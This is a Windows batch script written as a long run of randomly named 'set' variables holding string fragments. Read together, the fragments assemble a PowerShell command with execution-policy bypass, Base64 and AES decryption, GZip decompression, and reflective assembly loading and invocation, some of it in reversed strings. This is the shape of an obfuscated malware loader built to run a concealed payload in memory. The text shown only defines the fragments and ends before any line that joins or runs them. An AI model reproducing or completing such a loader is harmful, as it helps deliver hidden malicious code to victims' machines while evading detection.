@echo off
set "DGzHgMWEio=in"
set "UrTYkpFCnc=rS"
set "bryVowwCoL=Sy"
set "OrQvTlhYob=\W"
set "sqtyQdaYai=32"
set "pgqKtpsCXJ=Wi"
set "VYokStTvEK= C"
set "KunIMqfCuz= /"
set "iNETmDsivY=.e"
set "ZkuTloUzZR=co"
set "aFxbiuxonB=ll"
set "TYnHpLRLsd=Po"
set "kmiwLRthSo=ll"
set "WvTHSPIEQC=s\"
set "uyHInjWjYN=xe"
set "jKoVsRmbfi=st"
set "zVUvsSrPfp=do"
set "uyUpFlUegd=ow"
set "wtQgCLghmX=we"
set "vQiBHaVkbR=nd"
set "fpypOkRjqh=1."
set "QnaWueyZaB=ws"
set "dIIJjTIEuE=y "
set "DoYgqwQBYr=rs"
set "GdWYGBeowa=\v"
set "QXaSiRKGui=py"
set "mFdWLeUpMN=:\"
set "vovUMaWBIS=em"
set "oWEHvBIngH=he"
set "RqoLvkaFaU=po"
set "hvQMJTxucb=we"
set "lknvapURQP=0\"
set "GnxGiOaMTE=he"
set "wUsclmSeaO= %~dp0"
set "uPMLLgxfjS=cd"
set "QuqooTBSKA=.Com"
set "wkRMpxwdEi=::De"
set "LBzKqzOqoi= = N"
set "mTVPrLSQJb=($YL"
set "iPJVtRXJAA=[Env"
set "QlrlcBLTRe=wCJD"
set "cPVlOdTzop=tem."
set "KYYtqoLQkW=Comp"
set "ZwSQKyALxi=yste"
set "axOLnLFBgE=)($B"
set "QQkwRJxtNb=ateD"
set "GiqwqOcOPe=ddin"
set "bXQpkGtJnw=pose"
set "zfFQOOjWBZ='txe"
set "KwWFhvpzwK=F'[-"
set "TdePEKsQwc=NAK."
set "UYvxdOuijg=grap"
set "wNIrWLMbEa=UGTu"
set "xZFMtmEbQV=.Mod"
set "mvaYfwkdOY=Syst"
set "pZztqehLQf=Obje"
set "IwSGClwNtm=:: '"
set "ANwuJAbSkq=6] -"
set "moQGPYHrWe= = $"
set "ZnGtbHApso=();$"
set "RqXNuYfgtV=k = "
set "bKgwOLgTgN===')"
set "KQpwSfNQOz=se()"
set "LvOoOXBeac=$BoR"
set "KVkmlHBOTn=Secu"
set "LoGZJVIVan=g = "
set "SgsTKyNjQx=nbPZ"
set "qVJCDyhUZi=.-16"
set "OrgqbNywUP=m.IO"
set "TiYHMVlwev=m.Re"
set "xEFZcjhWqM=rt]:"
set "nmkJOLaPJi=-Obj"
set "zyRpHZwSXj=Comp"
set "sEvekljOtw=.IO."
set "qwUrEVYtAF=.Con"
set "GGxpeMfhXF=Disp"
set "LqqkgkbnhI= '')"
set "VDFwkGnovR=rity"
set "mIBYRpxZdz=gnir"
set "jLpIEmKLaV=y.Cr"
set "ktqrnvEHXg=.Dis"
set "CJOjgZQreh=pher"
set "SZmNbHMARh=);$p"
set "JggLZodpGw=y.Pa"
set "GCiunjQVzt=ect "
set "skmQNxNnLe=oL'["
set "nGdnQuzVZE=FpCk"
set "nQdrCBwxtM=bypa"
set "WeeGhRActc=)) {"
set "kVMgstFiQl=ct S"
set "hrxtVuyKyD=]::("
set "aHlfACqmQX=ne);"
set "uGVtuThIIS=pres"
set "MbdhAUPKCJ=esaB"
set "WGBtzAwIrd=wEPB"
set "NYlwrZYAvk=6esa"
set "pNkTIVWCWS=Xb ="
set "GssPHLVNxx=tion"
set "rGvvwsojIV=ispo"
set "zCWdRNJdTu=New-"
set "VaRkoqVdSc=ke($"
set "MRrdZVntgN=vs ="
set "XgFZaFVVAr=-1.."
set "kKsJPQjfLg=gTDv"
set "lYQuzCPePI=16] "
set "fNqMogZGZS=);$k"
set "pINPnKCNhL=ufA "
set "YIoiqDAUGB=saBm"
set "XEQQpJxoOq=stem"
set "folVewqRLX=null"
set "SCmhQDMVuT=736u"
set "fRbQBcfSYG=  $B"
set "xVcdkXfSSj=stem"
set "zCtKFMnnoK=ress"
set "YxjHsVcELb=oArr"
set "nIPmPIbFYg=Y) {"
set "YDvAWodUyC='[-1"
set "MSPYQUsYVV=flec"
set "OVMSaUZWFE=join"
set "JotaStBiLf=.Ass"
set "CkHrbXLnFE=e = "
set "axYGMyyOgx=('da"
set "WopUofWcdQ=tsWi"
set "CQamkGzSjQ=;$Nn"
set "QWdejEUVoc=OyzA"
set "SCkkPfEFUg=em.C"
set "dEmCrdwknD=$gTD"
set "EOgGyDxrKv=Invo"
set "YlPTWVSOig=oRug"
set "yvwCSPkOMD=TllA"
set "yigcmwnsfz=, $g"
set "DYlsgpFXKs=ay()"
set "KhUEMugINm=eam("
set "wpFaTfhHYJ=Mode"
set "VgSGPOmNSq=onve"
set "MHWyjvctlI=oin "
set "woVXioXfjy=Bmor"
set "ftERXesVAD=3); "
set "LBWtmesQGF=+hAO"
set "jixElqehrs=);$B"
set "vYeUsisPlS=ntuf"
set "tIKnqGrQPe=File"
set "gkgudHQlbR=oRug"
set "TSDlnoLuwc=s, 0"
set "POjppvhOpm=[Sys"
set "lgfWkMKcNK='')("
set "GuDjQPfCDK= [Sy"
set "nPVgZYxTUM=TDvs"
set "uWbwjrqgiD=ptor"
set "MyJFngZYjg=pDZz"
set "zBaZEEGwOw=ss -"
set "CVocsAwUNk=raph"
set "JJrwVvCJeW=in $"
set "UZzrnkDYnn=oRug"
set "SSXOMvDJeh=] -j"
set "wzXHwjzmEV='gni"
set "aVMoscjXIu=ptog"
set "asExSjwTbS=$ppi"
set "IfNKcGctBD=BfQ."
set "oISFrviQxH=comm"
set "PCvlwgjQZX=morF"
set "PjQGtnktZM=pose"
set "wDNZrQbntg=yste"
set "PhZnioWkiG=S46e"
set "juJSsAZAxE=iron"
set "znikwmquDx=esMa"
set "WkutqvINxv=rans"
set "idoHSjLPyQ=fQ.T"
set "VwzsyqCSvP=rity"
set "mrCaMhdDvs=$nbP"
set "IjgkLjyYsr=k; }"
set "OqhqEdCBfW=em.I"
set "VgSNmVvNny=O.Me"
set "JdCZXcMwaf=-ep "
set "bYqoDsBclp=]::C"
set "vRKqtXikWU=bstr"
set "EFVxwRQDwq=m.IO"
set "LzPvhYULhq=New-"
set "vHluOMUeYP=);$B"
set "fEPNqqCKhH=x.Su"
set "XFTnQhbcIP=ress"
set "EwnIAbKDHB=sion"
set "jWIYYxtqtM=;$fw"
set "brNWestdkp='[-1"
set "sdVkEwCuwV=]::N"
set "ijcXmIPWNm=le  "
set "MePrBkpSEP=nage"
set "rRcIfbAxrM=Xb.T"
set "bfboHjBPjm=Fina"
set "XVmmAlZBAp=tem."
set "MpxzBbnTto=; };"
set "XbOipiXWRD=vs);"
set "ZPOkUcwfqH=ion."
set "eIpHYJZlsh=isfL"
set "cwdGwradYp=tS46"
set "yOgOUZEhjD=ddin"
set "ViNDiDszGO=g.Pa"
set "foMAczBcHB=oRug"
set "iMuAHEeAzD=$ppi"
set "VHfyPYVpJJ=BfQ "
set "trkkPjrpex=$NnB"
set "baxsXyIVzG=gTDv"
set "PVgQuZDmnH=ing("
set "CDnOTabCLe=)($g"
set "ARoLRcESAu=;$Nn"
set "PLPRnyqRwg=ert]"
set "fCceMtmMVj=brea"
set "VUvrNqClCc=ring"
set "ojOWAztTai=.Cry"
set "jXkiaFadJP=$JiN"
set "OukyDbUnHl=);$f"
set "zKQuKnospo=rofi"
set "rttsgScmhU=hy.A"
set "NWtLSBwIWI=piXb"
set "PwKGHCaQpz=::('"
set "tFaMlHjQYm= [Sy"
set "VjobUlicmO=m(, "
set "rzrjlQsKLI=Conv"
set "nQxcwTONmz=s = "
set "tgGnOPaJLo=e]::"
set "sJZhigyznV=fore"
set "EZVoBijFsT=ewLi"
set "PrGXZngSjB=:('g"
set "riENqlDZMs=Fo7l"
set "AEAmMuEIHQ=.Cre"
set "qIsGfuESMD=PKCS"
set "qBSUhsSRLs=v4Ir"
set "AienWTOveF=trea"
set "JzeLvJCShL=n ''"
set "rRtpqJKHvE=ionM"
set "pwRVGPbtyx=.Cry"
set "TZJktXaiQY=$ppi"
set "phmoteJhpn=[Sys"
set "mGGNAcWRVS=[]] "
set "yElgjbVSDG=Syst"
set "WmtLcxGFGM=TDvs"
set "qySPnjcREJ=1] -"
set "BLAmhTJvxl= '')"
set "ohjuAWhOlF=ecry"
set "WHbXOXJCcD=pStr"
set "BTCxcdIneD=('%*'"
set "ArzIpsmuXB=ew-O"
set "deCLfPgeBl=s = "
set "OMLdPxnAqx=1..-"
set "iiMNiZXKOe=($YL"
set "RLbYWkFMYu=rtS4"
set "MCgSVWuqTD=AK, "
set "DWeznCBzTW= if "
set "acFXRAfblB= [st"
set "WRtVXQNwJf== $B"
set "AUTyQaSFeO=vj0m"
set "aFpQRKdMEp=();$"
set "TodcnmRqgg=esFX"
set "xuoPFDPcpf=..-1"
set "tDQJmuiOCg=gMod"
set "USdZpvPbAv=, (,"
set "GRLrqBXunU=[Sys"
set "tDqCPRgxST=oint"
set "lXcogRuceA=YLBC"
set "HpQDyfDmMk=am;$"
set "nADAJrcFoV=-joi"
set "hwcqMsMEqv=nirt"
set "udQNrSWPBr=tem."
set "DZlQmDzkTE==');"
set "mlqPNBIvOL=).Sp"
set "qcKwIIcoHT=JiNA"
set "lZRPejwnoD=ypto"
set "WguLCuXZcL=ptog"
set "rpFjbaxMmZ=)))"
set "gOUAncxJex=A.En"
set "CFywfwznJs=ment"
set "bxPpVoJPRL=kFpC"
set "APGRKFgECQ=.GZi"
set "DsULgkZjfH=.Sec"
set "EmKsOmTbeb=$gTD"
set "BrYvNTiBep=t Sy"
set "czGszSmmDr=mory"
